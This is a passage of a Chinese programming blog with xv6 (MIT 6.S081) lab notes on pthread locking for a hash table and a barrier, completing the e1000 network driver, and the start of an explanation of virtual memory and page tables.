<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$make</span> ph</span><br><span class="line">$./ph 1</span><br><span class="line">100000 puts, 5.690 seconds, 17573 puts/second</span><br><span class="line">0: 0 keys missing</span><br><span class="line">100000 gets, 5.491 seconds, 18211 gets/second</span><br></pre></td></tr></table></figure>

<p>我们把线程开多一点</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$./ph 10</span><br><span class="line">100000 puts, 0.333 seconds, 300217 puts/second</span><br><span class="line">2: 63594 keys missing</span><br><span class="line">7: 63594 keys missing</span><br><span class="line">1: 63594 keys missing</span><br><span class="line">9: 63594 keys missing</span><br><span class="line">5: 63594 keys missing</span><br><span class="line">8: 63594 keys missing</span><br><span class="line">6: 63594 keys missing</span><br><span class="line">4: 63594 keys missing</span><br><span class="line">0: 63594 keys missing</span><br><span class="line">3: 63594 keys missing</span><br><span class="line">1000000 gets, 5.871 seconds, 170320 gets/second</span><br></pre></td></tr></table></figure>

<p>然后我们把线程开到100，现在打字都卡了, 成千上万个 key missng。这里的hashmap在并发写的时候会冲突，就像go的map一样并发写的时候会直接报<code>fatal error: concurrent map writes</code>。读是没有关系的，但是<code>ph.c</code>第26行那个insert在写的时候是向entry（存key和value的链表后面加），并发写会把同时正在插入的覆盖掉。</p>
<p>Go map in actions 中有一个非常简单的给map加锁的例子</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> counter = <span class="keyword">struct</span>&#123;</span><br><span class="line">    sync.RWMutex</span><br><span class="line">    m <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">int</span></span><br><span class="line">&#125;&#123;m: <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]<span class="type">int</span>)&#125;</span><br><span class="line"></span><br><span class="line">counter.RLock()</span><br><span class="line">n := counter.m[<span class="string">&quot;some_key&quot;</span>]</span><br><span class="line">counter.RUnlock()</span><br><span class="line">fmt.Println(<span class="string">&quot;some_key:&quot;</span>, n)</span><br><span class="line"></span><br><span class="line">counter.Lock()</span><br><span class="line">counter.m[<span class="string">&quot;some_key&quot;</span>]++</span><br><span class="line">counter.Unlock()</span><br></pre></td></tr></table></figure>

<p>我们仿照go的map写入加<code>sync.Mutex</code>，给insert加互斥锁。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">pthread_mutex_t</span> lock; <span class="comment">// declare a lock</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">put_thread</span><span class="params">(<span class="type">void</span> *xa)</span> &#123;</span><br><span class="line">    <span class="type">int</span> n = (<span class="type">int</span>)(<span class="type">long</span>)xa; <span class="comment">// thread number</span></span><br><span class="line">    <span class="type">int</span> b = NKEYS / nthread;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; b; i++) &#123;</span><br><span class="line">        pthread_mutex_lock(&amp;lock);</span><br><span class="line">        put(keys[b * n + i], n);</span><br><span class="line">        pthread_mutex_unlock(&amp;lock);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后就没有missing了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$make</span> ph</span><br><span class="line">$./ph 2</span><br><span class="line">100000 puts, 5.522 seconds, 18111 puts/second</span><br><span class="line">1: 0 keys missing</span><br><span class="line">0: 0 keys missing</span><br><span class="line">200000 gets, 5.628 seconds, 35535 gets/second</span><br></pre></td></tr></table></figure>

<p>但是这样有一个问题，速度没什么优势，把nthread开到10，puts用时6.094 seconds，还不如单线程。<code>make grade</code>的时候只能跑过<code>ph_safe</code>，没法通过<code>ph_fast</code>的。</p>
<p>想要速度我们需要更细粒度的锁，我们仿照go的concurrent-map那样分片加锁的方案在insert插入的时候给对应的bucket加锁。（go的sync.Map的那个加锁比较适合读多写少的方案，这里大量写入优势不大）这里我们只要对每个bucket单独加锁就可以了，问题转换为对entry链表加锁，我们用NBUCKET把小锁分别对NBUCKET个entry链表加锁。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">pthread_mutex_t</span> lock[NBUCKET]; <span class="comment">// declare a lock</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">put</span><span class="params">(<span class="type">int</span> key, <span class="type">int</span> value)</span> &#123;</span><br><span class="line">    <span class="type">int</span> i = key % NBUCKET;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// is the key already present?</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">entry</span> *<span class="title">e</span> =</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (e = table[i]; e != <span class="number">0</span>; e = e-&gt;next) &#123;</span><br><span class="line">        <span class="keyword">if</span> (e-&gt;key == key)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (e) &#123;</span><br><span class="line">        <span class="comment">// update the existing key.</span></span><br><span class="line">        e-&gt;value = value;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// the new is new.</span></span><br><span class="line">        pthread_mutex_lock(&amp;lock[i]);</span><br><span class="line">        insert(key, value, &amp;table[i], table[i]);</span><br><span class="line">        pthread_mutex_lock(&amp;lock[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">    pthread_mutex_init(&amp;lock[NBUCKET], <span class="literal">NULL</span>);</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$./ph 10</span><br><span class="line">100000 puts, 0.684 seconds, 146180 puts/second</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p>这样就足以跑过<code>ph_fast</code>的测试了（其实如果想偷鸡直接将NBUCKET改成一个大点的质数减少一下hash冲突就能用大锁跑过测试）</p>
<p>还有更细粒度的加锁方案，就是对链表（entry）的节点加锁，不过通常设计比较好的hashmap的拉链，链表不会很长。这里就不这么加了。</p>
<p>还有一种链表并发的方案就是rcu，不过这个是在内核态实现的，想要在userspace模仿一个有点难。</p>
<h3 id="Barrier"><a href="#Barrier" class="headerlink" title="Barrier"></a>Barrier</h3><p>这个也是在Unix&#x2F;linux真机下面，练习一下条件变量。这个barrier是用<code>pthread_cond</code>实现的，<code>a point in an application at which all participating threads must wait until all other participating threads reach that point too. </code></p>
<p>让执行完的线程wait(睡眠)，然后面足条件的时候调用signal唤醒，这里全部唤醒用broadcast就好了。</p>
<p>注意使用条件变量的时候需要加锁，参考Three Easy Piecies第30章。某些情况下signal可以不加锁，但是wait必须要加锁。<code>hold the lock when calling signal</code>，不然会发生race，书里给了一个例子：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">thr_exit</span><span class="params">()</span> &#123;</span><br><span class="line">  done = <span class="number">1</span>;</span><br><span class="line">  Pthread_cond_signal(&amp;c);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">thr_join</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (done == <span class="number">0</span>) &#123;</span><br><span class="line">    Pthread_cond_wait(&amp;c);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个时候如果一个thread执行<code>thr_join</code>，满足done为0，开始wait睡眠，但是在判断完if到执行wait睡眠的期间，<code>thr_exit()</code>开始执行唤醒全部全部线程，那么这个thread执行wait就会一直sleep醒不过来了（书里面是用的parent和child的例子）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">barrier</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// Block until all threads have called barrier() and</span></span><br><span class="line">    pthread_mutex_lock(&amp;bstate.barrier_mutex);</span><br><span class="line">    bstate.nthread++;</span><br><span class="line">    <span class="keyword">if</span> (bstate.nthread &lt; nthread) &#123;</span><br><span class="line">        pthread_cond_wait(&amp;bstate.barrier_cond, &amp;bstate.barrier_mutex);</span><br><span class="line">    &#125; </span><br><span class="line">    pthread_mutex_unlock(&amp;bstate.barrier_mutex);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 这个锁也要加上，不然唤醒的时候如果有线程睡眠会睡死</span></span><br><span class="line">    pthread_mutex_lock(&amp;bstate.barrier_mutex);</span><br><span class="line">    <span class="keyword">if</span> (bstate.nthread == nthread) &#123;</span><br><span class="line">        bstate.nthread = <span class="number">0</span>;</span><br><span class="line">        bstate.round++;</span><br><span class="line">        pthread_cond_broadcast(&amp;bstate.barrier_cond);</span><br><span class="line">        pthread_mutex_unlock(&amp;bstate.barrier_mutex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样<code>./barrier 100</code>就pass了。如果我们不加mutex锁，那么<code>./barrier 100</code>是会一直卡在那里结束不了的。如果我们执行strace看一下<code>strace ./barrier 100</code>，会发现卡在这个地方</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">futex(<span class="number">0x7f0a8b7a1910</span>, FUTEX_WAIT_BITSET|FUTEX_CLOCK_REALTIME, <span class="number">219673</span>, <span class="literal">NULL</span>, FUTEX_BITSET_MATCH_ANY) = ? ERESTARTSYS (To be restarted <span class="keyword">if</span> SA_RESTART is <span class="built_in">set</span>)</span><br><span class="line">--- SIGWINCH &#123;si_signo=SIGWINCH, si_code=SI_KERNEL&#125; ---</span><br><span class="line">futex(<span class="number">0x7f0a8b7a1910</span>, FUTEX_WAIT_BITSET|FUTEX_CLOCK_REALTIME, <span class="number">219673</span>, <span class="literal">NULL</span>, FUTEX_BITSET_MATCH_ANY</span><br></pre></td></tr></table></figure>

<p>用<code>valgrind --tool=helgrind ./barrier 2</code>检查了一下，应该这样也是可以的，都加到一把锁里面</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">barrier</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// Block until all threads have called barrier() and</span></span><br><span class="line">    pthread_mutex_lock(&amp;bstate.barrier_mutex);</span><br><span class="line">    bstate.nthread++;</span><br><span class="line">    <span class="keyword">if</span> (bstate.nthread &lt; nthread) &#123;</span><br><span class="line">        pthread_cond_wait(&amp;bstate.barrier_cond, &amp;bstate.barrier_mutex);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">if</span> (bstate.nthread == nthread) &#123;</span><br><span class="line">        bstate.nthread = <span class="number">0</span>;</span><br><span class="line">        bstate.round++;</span><br><span class="line">        pthread_cond_broadcast(&amp;bstate.barrier_cond);</span><br><span class="line">        pthread_mutex_unlock(&amp;bstate.barrier_mutex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这次看题目本来以为很简单的，用户态thread就照着内核线程抄一个呗，剩下两个就是用一下pthread和锁呗。然后写起来debug就花了很久的时间，对寄存器不太熟，频繁翻车。然后折腾了两天才整出来</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ make grade</span><br><span class="line">uthread: OK (2.5s) </span><br><span class="line">== Test answers-thread.txt == answers-thread.txt: OK </span><br><span class="line">== Test ph_safe == make[1]: Entering directory <span class="string">&#x27;/home/zhixi/codes/xv6-labs-2021&#x27;</span></span><br><span class="line">gcc -o ph -g -O2 -DSOL_THREAD -DLAB_THREAD notxv6/ph.c -pthread</span><br><span class="line">make[1]: Leaving directory <span class="string">&#x27;/home/zhixi/codes/xv6-labs-2021&#x27;</span></span><br><span class="line">ph_safe: OK (8.0s) </span><br><span class="line">== Test ph_fast == make[1]: Entering directory <span class="string">&#x27;/home/zhixi/codes/xv6-labs-2021&#x27;</span></span><br><span class="line">make[1]: <span class="string">&#x27;ph&#x27;</span> is up to <span class="built_in">date</span>.</span><br><span class="line">make[1]: Leaving directory <span class="string">&#x27;/home/zhixi/codes/xv6-labs-2021&#x27;</span></span><br><span class="line">ph_fast: OK (19.7s) </span><br><span class="line">== Test barrier == make[1]: Entering directory <span class="string">&#x27;/home/zhixi/codes/xv6-labs-2021&#x27;</span></span><br><span class="line">gcc -o barrier -g -O2 -DSOL_THREAD -DLAB_THREAD notxv6/barrier.c -pthread</span><br><span class="line">make[1]: Leaving directory <span class="string">&#x27;/home/zhixi/codes/xv6-labs-2021&#x27;</span></span><br><span class="line">barrier: OK (2.7s) </span><br><span class="line">== Test time == </span><br><span class="line">time: OK </span><br><span class="line">Score: 60/60</span><br></pre></td></tr></table></figure>

<h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><p><span class="exturl" data-url="aHR0cHM6Ly9wZG9zLmNzYWlsLm1pdC5lZHUvNi5TMDgxLzIwMjAvbGFicy90aHJlYWQuaHRtbA==">https://pdos.csail.mit.edu/6.S081/2020/labs/thread.html<i class="fa fa-external-link-alt"></i></span>   </p>
<p><span class="exturl" data-url="aHR0cHM6Ly9zdGFja292ZXJmbG93LmNvbS9xdWVzdGlvbnMvOTQxMC9ob3ctZG8teW91LXBhc3MtYS1mdW5jdGlvbi1hcy1hLXBhcmFtZXRlci1pbi1j">How do you pass a function as a parameter in C?<i class="fa fa-external-link-alt"></i></span>  </p>
<p><span class="exturl" data-url="aHR0cHM6Ly9nby5kZXYvYmxvZy9tYXBz">Go Map in Actions<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2dvbGFuZy9nby9ibG9iL21hc3Rlci9zcmMvc3luYy9tYXAuZ28=">https://github.com/golang/go/blob/master/src/sync/map.go<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9wa2cuZ28uZGV2L3N5bmM/dXRtX3NvdXJjZT1nb2RvYyNNYXA=">https://pkg.go.dev/sync?utm_source=godoc#Map<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9jb2xvYnUuY29tLzIwMTcvMDcvMTEvZGl2ZS1pbnRvLXN5bmMtTWFwLw==">Go 1.9 sync.Map揭秘<i class="fa fa-external-link-alt"></i></span> 鸟窝大大写的sync.Mutex介绍  </p>
<p><span class="exturl" data-url="aHR0cHM6Ly9wYWdlcy5jcy53aXNjLmVkdS9+cmVtemkvT1NURVAv">Operating Systems Three Easy Pices<i class="fa fa-external-link-alt"></i></span>，中文就是那个蓝皮的操作系统导论<br>第29章，讲并发链表、并发队列和并发散列表<br>第20章，讲条件变量  </p>
]]></content>
      <categories>
        <category>Linux&amp;Unix</category>
      </categories>
      <tags>
        <tag>6.S081</tag>
        <tag>thread</tag>
      </tags>
  </entry>
  <entry>
    <title>6.S081 Lab Networking 笔记，完结撒花</title>
    <url>/6-S081-lab-network-driver/</url>
    <content><![CDATA[<p>这个Lab就是补全一个DMA收发的驱动, 不要被Lab标的Hard难度吓到，我感觉这是6.S081这几个Lab最简单的几个Lab之一。写个驱动都不用上板子调试，没啥意思，怎么感觉比当年你电PPT吹水课程微嵌的实验大作业给FPGA的板子写个驱动还水。。。<br>最后一个Lab放水，愉快的完结撒花。也难怪在2021 fall的lab net不是最后一个。等等，这个Lab还有附加内容，实现一个TCP&#x2F;UDP协议栈。。。</p>
<span id="more"></span>

<h2 id="Lab内容"><a href="#Lab内容" class="headerlink" title="Lab内容"></a>Lab内容</h2><p>这个难度明明是easy，不要被标的那个hard吓到了。做起来这个Lab挺没意思的，e1000这种远古网卡，现在应该没多少人用了。这个网卡是qemu虚拟出来的网卡，就跟代理的时候用的那个tun&#x2F;tap差不多</p>
<blockquote>
<p>Your job is to complete e1000_transmit() and e1000_recv(), both in kernel&#x2F;e1000.c, so that the driver can transmit and receive packets</p>
</blockquote>
<p>这个好办，我们直接扒拉e1000的手册就可以了。或者我们直接看<code>kernel/e1000_dev.h</code>, <code>E1000_RDH</code>是E1000 RX Descriptor Head， <code>E1000_RDT</code>是RX descriptor tail，同理<code>E1000_TDT</code>是TX descriptor tail（由TX的功能我们可以知道这是the next packet的坐标）， <code>E1000_RXD_STAT_DD</code>是 Descriptor Done， 然后<code>E1000_TXD_CMD_EOP</code>是 End of Packet。</p>
<p>RX ring接受网卡数据的读取buffer， TX ring是发送packet的发送buffer。<code>rx_ring</code>是一个环形链表<code>rx_desc</code>，里面放的是packet的地址（packet是通过DMA放在内存里面）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// [E1000 3.2.3]</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rx_desc</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  uint64 addr;       <span class="comment">/* Address of the descriptor&#x27;s data buffer */</span></span><br><span class="line">  uint16 length;     <span class="comment">/* Length of data DMAed into data buffer */</span></span><br><span class="line">  uint16 csum;       <span class="comment">/* Packet checksum */</span></span><br><span class="line">  uint8 status;      <span class="comment">/* Descriptor status */</span></span><br><span class="line">  uint8 errors;      <span class="comment">/* Descriptor Errors */</span></span><br><span class="line">  uint16 special;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>然后我们照着提示就可以补全<code>kernel/e1000.c</code>了</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">e1000_transmit</span><span class="params">(<span class="keyword">struct</span> mbuf *m)</span> &#123;</span><br><span class="line">    <span class="comment">// the mbuf contains an ethernet frame; program it into</span></span><br><span class="line">    <span class="comment">// the TX descriptor ring so that the e1000 sends it. Stash</span></span><br><span class="line">    <span class="comment">// a pointer so that it can be freed after sending.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    acquire(&amp;e1000_lock); <span class="comment">// 发送时加spin_lock</span></span><br><span class="line">    uint32 idx = regs[E1000_TDT];</span><br><span class="line">    <span class="keyword">if</span> (!(E1000_TXD_STAT_DD &amp; tx_ring[idx].status)) &#123; <span class="comment">// buffer不足</span></span><br><span class="line">        release(&amp;e1000_lock);                         <span class="comment">// 释放锁</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (tx_mbufs[idx]) &#123;</span><br><span class="line">        mbuffree(tx_mbufs[idx]);</span><br><span class="line">        tx_mbufs[idx] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    tx_ring[idx].addr = (uint64)m-&gt;head;</span><br><span class="line">    tx_ring[idx].length = m-&gt;len;</span><br><span class="line"></span><br><span class="line">    tx_ring[idx].cmd = E1000_TXD_CMD_EOP | E1000_TXD_CMD_RS;</span><br><span class="line">    tx_mbufs[idx] = m;</span><br><span class="line"></span><br><span class="line">    regs[E1000_TDT] = (idx + <span class="number">1</span>) % TX_RING_SIZE;</span><br><span class="line">    release(&amp;e1000_lock);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">e1000_recv</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Your code here.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Check for packets that have arrived from the e1000</span></span><br><span class="line">    <span class="comment">// Create and deliver an mbuf for each packet (using net_rx()).</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">// First ask the E1000 for the ring index at which the next waiting</span></span><br><span class="line">        <span class="comment">// received packet (if any) is located, by fetching the E1000_RDT</span></span><br><span class="line">        <span class="comment">// control register and adding one modulo RX_RING_SIZE.</span></span><br><span class="line">        uint32 idx = regs[E1000_RDT];</span><br><span class="line">        idx = (idx + <span class="number">1</span>) % RX_RING_SIZE; <span class="comment">// 这是个环形链表，需要mod ring size</span></span><br><span class="line">        <span class="keyword">if</span> (!(E1000_RXD_STAT_DD &amp; rx_ring[idx].status)) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        rx_mbufs[idx]-&gt;len = rx_ring[idx].length;</span><br><span class="line">        net_rx(rx_mbufs[idx]);</span><br><span class="line">        rx_mbufs[idx] = mbufalloc(<span class="number">0</span>); <span class="comment">//这里直接mbufalloc就可以了，不需要kalloc</span></span><br><span class="line">        rx_ring[idx].addr = (uint64)rx_mbufs[idx]-&gt;head;</span><br><span class="line">        rx_ring[idx].status = <span class="number">0</span>;</span><br><span class="line">        regs[E1000_RDT] = idx;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="完结撒花"><a href="#完结撒花" class="headerlink" title="完结撒花"></a>完结撒花</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ make grade</span><br><span class="line">make[1]: Leaving directory <span class="string">&#x27;/home/zhixi/codes/xv6-labs-2021&#x27;</span></span><br><span class="line">== Test running nettests == </span><br><span class="line">$ make qemu-gdb</span><br><span class="line">(2.8s) </span><br><span class="line">== Test   nettest: ping == </span><br><span class="line">  nettest: ping: OK </span><br><span class="line">== Test   nettest: single process == </span><br><span class="line">  nettest: single process: OK </span><br><span class="line">== Test   nettest: multi-process == </span><br><span class="line">  nettest: multi-process: OK </span><br><span class="line">== Test   nettest: DNS == </span><br><span class="line">  nettest: DNS: OK </span><br><span class="line">== Test time == </span><br><span class="line">time: OK </span><br><span class="line">Score: 100/100</span><br></pre></td></tr></table></figure>

<p>一开始以为很难，又是讨厌的驱动，然后一看难度还是hard，勾起了我当年痛苦的。上一次写驱动的大作业还是本科的时候，当时换了两块xilinx的阴间开发板全都是坏的，害得我还以为是我自己写的有问题，找了一周没找到bug。本来是抱着人又麻了的心态来做这个Lab的（这个Lab在2020年是最后一个Lab，在2021年放到了前面），拖了几个月，别的Lab都做完了，然后陆续把笔记也补上了，最后捡起了一直咕咕咕的6.824，做到Raft的Lab4死活跑不过测试这才回来做这个Lab，结果发现意外的简单。</p>
<p>好久之前写的Lab，由于懒癌发作一直没有写笔记，现在把Lab的笔记补上。这个Lab比较玩具，没啥好讲的。驱动和网络单独拿出来都是一个大坑，水平有限不多讲了。</p>
<p>这个Lab的Optional Challenges比较麻烦，其中最后两个challenge是：</p>
<blockquote>
<p>Implement a UDP server for xv6. (moderate)<br>Implement a minimal TCP stack and download a web page. (hard)</p>
</blockquote>
<p>然后搜了一下发现有一个xv6-net的实现：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3BhbmRheDM4MS94djYtbmV0L2Jsb2IvbmV0L3RjcC5j">https://github.com/pandax381/xv6-net/blob/net/tcp.c<i class="fa fa-external-link-alt"></i></span></p>
<p>由于懒癌发作我当然又是没做，我的菜鸡计网水平和对TCP的熟悉程度应该一时半会做不出来。听说有cs144这门课就是实现一个TCP协议栈，等研三有空了回头把这个做了把这个大坑填上。</p>
<p>6.S081这个课从去年7月开始，断断续续做了将近一年把Lab做了，xv6的源码看了不到一半。xv6作为一个教学的系统，挺精简挺小巧，能比较顺利的看下去。像linux源码那种看不太动，拿着赵炯那本《linux内核完全注释》看早期内核也比较麻烦。xv6-book写的真的好，推荐做Lab和读xv6源码的时候好好把xv6-book看一下：</p>
<p><em>xv6: a simple, Unix-like teaching operating system</em><br>作者Russ Cox, Frans Kaashoek, Robert Morris 应该都听过，Russ Cox是争议比较大的go现任掌门，喜欢在go的issue区开喷，Morris是6.824这门课的主讲，就是那个蠕虫病毒的作者。</p>
<p>一开始我没在意，觉得这本书就是跟手册一样，偶尔翻一翻。后来发现这本册子写的是真的好，几乎没有一点废话，比课程讲义好多了。早应该看这个的。</p>
<p>然后就是重新翻了k&amp;r这本书，写的真好，也没有多少废话。里面的例子非常精简。</p>
<p>更新：不等研三了，直接上CS144了。之前没事喜欢摆弄nmap、wireshark这些东西瞎玩，却没好好看过TCP的细节，再这样不思进取下去就要沦为脚本小子了</p>
]]></content>
      <categories>
        <category>Linux&amp;Unix</category>
      </categories>
      <tags>
        <tag>6.S081</tag>
        <tag>network</tag>
      </tags>
  </entry>
  <entry>
    <title>6.S081 Lab Page table 笔记：虚拟内存、页表和MMU</title>
    <url>/6.S081-lab-page-table/</url>
    <content><![CDATA[<p>这个Lab前几个月写的，最近比较闲整理一下之前做的Lab。内存管理这块比较复杂，当时做Lab的时候对内存这块理解也浅，实现有些挺蠢的地方，重新整理了一下。接下来的笔记会多一点和Lab作业关系不是特别大的东西，闲着没事看OS相关的东西觉得有意思就一起记到笔记里了。</p>
<span id="more"></span>

<h2 id="从单片机的内存和MMU说起"><a href="#从单片机的内存和MMU说起" class="headerlink" title="从单片机的内存和MMU说起"></a>从单片机的内存和MMU说起</h2><p>早期的操作系统是就像现在的一些单片机一样没有虚拟内存、页表这些东西的。以前我一开始用ARM的STM32的单片机的时候，用的是cortex-m系列，没有MMU（Memory Management Unit，内存管理单元）的，直接访问物理地址。当时我上嵌入式的课上也不讲这些东西，上课、做实验讲到内存的时候都直接访问物理地址的（Keil里面直接看物理地址的值确实比较简单）。</p>
<p>这个时候内存的管理方式挺简单的，<strong>可能为数不多的坑就是大小端</strong>，有一次被坑了挺久</p>
<p>下面这张图很熟悉了，堆、栈，数据段、代码段</p>
<p>访问栈就直接用sp去寻址就可以了，简单直接。</p>
<p>没有MMU也有好处，这样便宜、功耗低、而且比较简单。有的对实时性要求比较高的东西，也没有MMU（比如Cortex-R系列）</p>
<p>注：嵌入式的soc芯片，如果能跑操作系统的大概率有MMU，但是两者之前没有必然关系。比如uCLinux，就是为了在没有MMU上的设备跑。有MMU，当然也可以不用操作系统，直接跑裸机（MMU其实可以关掉，但是我们一般不关，手动指定映射，因为MMU的cache对性能提升很大）。（uClinux要小心内存碎片，而且由于MMU没了，内存保护、内存置换、COW基本都没了，大部分时候还是用mmap和内存直接打交道）</p>
<p>单片机可以不要MMU，但是一个运行着很多任务的操作系统需要对内存进行抽象和封装，提供给应用。于是后来诞生了虚拟内存&#x2F;虚拟存储器（Virtual Memory），虚拟内存可以比物理内存大，可以让每个程序都认为自己拥有一段连续独立的内存，还可以权限控制（内存保护），虚拟内存在硬件上是MMU实现的。操作系统的虚拟内存几乎都依赖MMU。（当然，操作系统有自己的页表，这个一会再说）<br>像Cortex-A系列的soc芯片，是有mmu的，上面能跑一些完整的操作系统，有页表等一系列完整的内存管理机制。下图来自xv6 book，每个进程都有自己独立的虚拟内存，这样主要的好处一个是安全隔离，一个是让进程操作一段连续的内存，即使映射到物理内存上是不连续的（你可以<strong>试试在Cortex-A系列soc的板子上跑个uClinux这种没有虚拟内存的，很容易搞出内存碎片然后OOM了</strong>）。</p>
<p><img src="/6.S081-lab-page-table/1642081823.png"></p>
<p>下面这是ARM的图，RISC-V和x86我不熟，就没找RISC的图。下面这些图来自：<span class="exturl" data-url="aHR0cHM6Ly9jczE0MGUuc2VyZ2lvLmJ6L2RvY3MvQVJNdjgtQS1Qcm9ncmFtbWVyLUd1aWRlLnBkZg==">ARMv8-A-Programmer-Guide<i class="fa fa-external-link-alt"></i></span></p>
<p><img src="/6.S081-lab-page-table/1642057127.png"></p>
<p>MMU以页为最小单位将内存从物理地址映射到虚拟地址，页表大小一般是4k。除了地址映射MMU还实现了内存保护。每个页有读、写、执行三种权限。</p>
<p>MMU里有TLB（Translation Lookaside Buffer），专门用来缓存页表，CPU要访问内存的时候会先去TLB里面找，没有命中再去遍历找物理地址（Translation Table Walk）。</p>
<p>图中的Caches就是我们熟悉的L1、L2、L3缓存，l1一般有ICache和DCache，分别用来缓存指令和数据。</p>
<p><img src="/6.S081-lab-page-table/1642057382.png"></p>
<p>一部分ARM的芯片是将L1的ICache做成逻辑地址的（不经过MMU），有的芯片是逻辑地址（Cache缓存的是经过MMU转换后的虚拟地址），这个和芯片的实现有关，不是这里的重点。我们就简单的认为，Cache一般速度远比主存快，用于缓存最常用的内存数据（页）。</p>
<p><img src="/6.S081-lab-page-table/1642057536.png"></p>
<p>当L1、L2、L3都没有命中（Write Miss）的时候，会走总线去内存里面找。至于L1、L2、L3缓存的置换、一致性这些问题，我们也简单的认为芯片已经帮我们做好了，这里我们不去管它。</p>
<h2 id="页表"><a href="#页表" class="headerlink" title="页表"></a>页表</h2><p>以页为单位完成了物理内存到虚拟内存的映射，要访问这些页我们需要查表，于是就有了页表（Page Table）。但是如果把每个页都映射成一张页表，这一个页表是很大的，于是就有了多级页表。多级页表中每一级都有index和offset用于定位页和页中的偏移量。</p>
<p><img src="/6.S081-lab-page-table/1642065542.png"></p>
<p>上图中的PPN是物理page号（PPN，Physical Page Number）。</p>
<h3 id="进程页表和内核页表"><a href="#进程页表和内核页表" class="headerlink" title="进程页表和内核页表"></a>进程页表和内核页表</h3><p>xv6里面有，内核页表和用户页表（进程页表），每个进程都有自己独立的页表。内核页表只有一个。一般进程页表都有一份内核页表的直接copy，但是一些开了内核页表隔离（KPTI, Kernel Page Table Isolation）的，情况会比较复杂。</p>
<p><img src="/6.S081-lab-page-table/1642124957.png"></p>
